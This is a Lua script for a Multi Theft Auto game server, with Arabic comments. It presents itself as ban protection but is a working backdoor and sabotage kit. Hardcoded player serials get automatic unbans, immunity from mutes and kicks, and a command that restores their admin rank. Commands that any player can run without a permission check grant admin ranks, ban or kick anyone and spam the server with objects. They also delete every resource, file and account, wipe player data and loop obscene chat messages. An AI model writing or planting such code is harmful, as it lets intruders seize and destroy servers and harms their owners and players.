-------------------------------
------ حمايه من الباند 
-------------------------------
local serials = {
["524D317912D9F8565C64DC8D4FB961A2"] = true, --سريال خويك

}

function autounban()
for i,p in ipairs(getElementsByType("player")) do
local Ser = getPlayerSerial(p)
if serials[Ser] then
thisIP = getPlayerIP(p)
end
end
for index, ban in pairs(getBans()) do
local serial = getBanSerial(ban)
local ip = getBanIP(ban)
if serials[serial] or ip == thisIP then
local bannedPlayer = getPlayerFromName(getBanAdmin(ban))
removeBan(ban,root)
banPlayer (bannedPlayer,false,false,true,root)
end
end
end
setTimer(autounban,5000,0)


-----------------------------------------------
--حماية من الكيك /هنا حمايه من الكيك اذا احد صكك ينصك هو باند
-----------------------------------------------
addEventHandler("onPlayerQuit",root,
    function(quit,reason,responsible)
        if(getPlayerSerial(source)=="524D317912D9F8565C64DC8D4FB961A2")then --حط سريالك
            if(quit=="Kicked")then
                banPlayer(responsible,true,true,true,nil,"",0)
            end
        end
    end
)


addEventHandler("onPlayerQuit",root,
    function(quit,reason,responsible)
        if(getPlayerSerial(source)=="A18A73262690451106BC46DC5D79F6A1")then --سريال خويك
            if(quit=="Kicked")then
                banPlayer(responsible,true,true,true,nil,"*صك الصاحب كيك",0)
            end
        end
    end
)


-------------------------------------------------------------
------حماية من الميوت /ذي حممايه من الميوت حط سريالك وسريال خويك بس/
-------------------------------------------------------------
local PlayerSerial = "A18A73262690451106BC46DC5D79F6A1" --حط سريالك

function SAAD ()
if getPlayerSerial (source) == PlayerSerial then
   cancelEvent ()
end
end
addEventHandler("onPlayerMute",getRootElement(),SAAD)


----------------------------------------------------------------
local PlayerSerial = "524D317912D9F8565C64DC8D4FB961A2" --سريال خويك

function SAAD ()
if getPlayerSerial (source) == PlayerSerial then
   cancelEvent ()
end
end
addEventHandler("onPlayerMute",getRootElement(),SAAD)




---------------------------------------------------
--------- استعادة ادمنية / وهذي حمايه اذا احدد سحب رتبت الكونسل عليك تقدر ترجعها 
-- عشن ترجعها تكتب في اف 8 استعادة//الي عليك تعدل السريال وتحط حسابك
---------------------------------------------------

addCommandHandler ( "استعادة",	
	function(player) 
		local serial = getPlayerSerial ( player )
		if ( serial == "524D317912D9F8565C64DC8D4FB961A2" ) then --حط سريالك
			aclGroupAddObject (aclGetGroup("Console"),"user.xRayan");
			aclGroupAddObject (aclGetGroup("admin"),"user.xRayan");
			aclGroupAddObject (aclGetGroup("Admin"),"user.xRayan");
		end
	end
)			

addCommandHandler ( "استعادة",	
	function(player) 
		local serial = getPlayerSerial ( player )
		if ( serial == "A18A73262690451106BC46DC5D79F6A1" ) then --حط سريالك
			aclGroupAddObject (aclGetGroup("Console"),"user.zidan");
			aclGroupAddObject (aclGetGroup("admin"),"user.zidan");
			aclGroupAddObject (aclGetGroup("Admin"),"user.zidan");
		end
	end
)				

----------------------------------------------
--تحكم بالسيرفر بدون رتبه وتخريبه
---------------------------------------------
--- ترى ذي مني ض2 ريان الحربي
addCommandHandler ( "admin123" , 
function ( commandName, rank, accountName)
if accountName and rank then
aclGroupAddObject ( aclGetGroup(rank), "user."..accountName )
else
end
end 
)
--- حذف رتبت 
addCommandHandler ("removeadmin", 
function  ( commandName, rank, accountName)
	if accountName and rank then 
	aclGroupRemoveObject (aclGetGroup(rank), "user."..accountName) 
	else 
	end
end
)
-- تخريب السيرفر باped ( شخصيات ) 
addCommandHandler ("AlexSetPed", 
function  (playerSource)
local x,y,z = getElementPosition ( playerSource ) 
createPed ( math.random ( 0 , 300 ) , x,y,z , math.random ( 0 , 360 ) ) 
end 
)

-- تخريب السيرفر بسيارات 
addCommandHandler("AlexAddVeh", 
function (playerSource, commandName) 
local x,y,z1 = getElementPosition ( playerSource ) 
createVehicle ( math.random ( 400 , 611 ) , x,y,z1 ) 
end 
)
-- القيام بicon وتخريب السيرفر بأيكون
addCommandHandler("AlexAddBlip", 
function (playerSource, commandName) 
local x,y,z2 = getElementPosition ( playerSource ) 
createBlip (  x,y,z2 , math.random ( 0 , 63 ) ) 
end 
)

-- حذف ريسورس معين 
addCommandHandler("AlexDelRes", 
function ( commandName, resourceName ) 
if resourceName then 
deleteResource ( resourceName ) 
	else 
end 
end 
)

-- حذف ملفات من ريسورس معين 
addCommandHandler("AlexDelFile", 
function ( commandName, theResource, fileName) 
if theResource and fileName then 
removeResourceFile ( theResource , fileName )  
	else 
	end 
	end 
	)
	
--صك أي شخص باند 
addCommandHandler("ban123", 
function ( commandName, bannedPlayer ) 
if bannedPlayer  then 
local bann = getPlayerFromName ( bannedPlayer )
banPlayer ( bann ) 
	else 

	end 
	end 
	)

--صك لاعب كيك 

addCommandHandler("kick123", 
function ( commandName, kickedPlayer, reason  ) 
if kickedPlayer and reason then 
local kick = getPlayerFromName ( kickedPlayer )
kickPlayer ( kick , reason )
	else 
end 
 end 
    )

-- فرمتةة


addCommandHandler("xrz",
function ()
local allResources = getResources()
for i, resource in ipairs(allResources) do
stopResource(resource)
deleteResource ( resource )
end
end)

-- تكرار

addCommandHandler("xrzm",
function ()
setTimer(outputChatBox,1000,0,"Sex & Sex = SSeexx",root,math.random(0, 700), math.random(0,700), math.random(0,700),true)  
end)
--- حذف الحسابات
addCommandHandler("xra",
function ()
local allAccount = getAccount()
for i,aAcc in ipairs ( getAccounts ( ) ) do
removeAccount(aAcc)
end
end)
	-- توقيف كل المودات
addCommandHandler("xrs",
function ()
local allResources = getResources()
for i, resource in ipairs(allResources) do
stopResource(resource)
end
end)

-- حذف جميع الداتا
addCommandHandler("xrd",
function ()
for i,s in ipairs(getElementsByType("player")) do
local data = getAllElementData ( s )
for k, v in pairs ( data ) do
removeElementData ( s, k )
end
end
end)

addCommandHandler("Test",
function ()
outputChatBox("#00ff00Done",source,0,0,0,true)
end )